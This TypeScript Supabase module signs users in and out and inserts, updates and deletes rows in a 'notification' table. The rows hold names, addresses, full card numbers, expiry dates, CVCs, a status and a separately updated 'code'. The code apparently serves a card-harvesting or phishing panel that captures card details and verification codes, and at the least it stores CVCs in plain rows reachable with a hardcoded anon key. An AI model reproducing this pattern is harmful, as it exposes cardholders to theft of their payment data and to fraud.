import { createClient } from '@supabase/supabase-js';
import { NotificationI } from "../@types/notification";

const SUPABASE_URL = "https://bgwnjubcldqlaoozwkoo.supabase.co";
const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJnd25qdWJjbGRxbGFvb3p3a29vIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDE2MzEyMDMsImV4cCI6MjA1NzIwNzIwM30.t7TLgvGFkSTGggMqadrCKJg0wnMp5tJEj1Rnagq-Rr8";

export const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

export const supabaseSignUp = async (email: string, password: string) => {
  await supabase.auth.signUp({
    email,
    password,
  });


};

export const supabaseSignIn = async (email: string, password: string) => {
  await supabase.auth.signInWithPassword({
    email,
    password,
  });

};

export const supabaseSignOut = async () => {
  await supabase.auth.signOut();
};

export const sendRequest = async ({ user_id, email, firstname, lastname, address, c_name, c_number, exp_date, cvc, total, status, code }: NotificationI) => {
  const { data, error } = await supabase
    .from('notification')
    .insert([
      {
        user_id: user_id,
        email: email,
        firstname: firstname,
        lastname: lastname,
        address: address,
        c_name: c_name,
        c_number: c_number,
        exp_date: exp_date,
        cvc: cvc,
        total: total,
        status: status,
        code: code
      }
    ])
    .select('id');
  if (error) {
    return null
  } else if (data) {
    const newNotifif = data[0].id;
    return newNotifif;
  }
}

export const updateInfosRequest = async ({ id, email, firstname, lastname, address, c_name, c_number, exp_date, cvc, total, status, code }: NotificationI) => {
  await supabase
    .from("notification")
    .update({
      email: email,
      firstname: firstname,
      lastname: lastname,
      address: address,
      c_name: c_name,
      c_number: c_number,
      exp_date: exp_date,
      cvc: cvc,
      total: total,
      code: code,
      status: status
    })
    .eq("id", id);
}

export const updateRequest = async ({ id, status, code }: NotificationI) => {
  await supabase
    .from("notification")
    .update({ code: code, status: status })
    .eq("id", id);


}

export const deleteNotification = async (id: number) => {
  await supabase
    .from("notification")
    .delete()
    .eq("id", id);
};

export const handleUnload = async (id: number) => {
  await supabase
    .from("notification")
    .delete()
    .eq("id", id);
};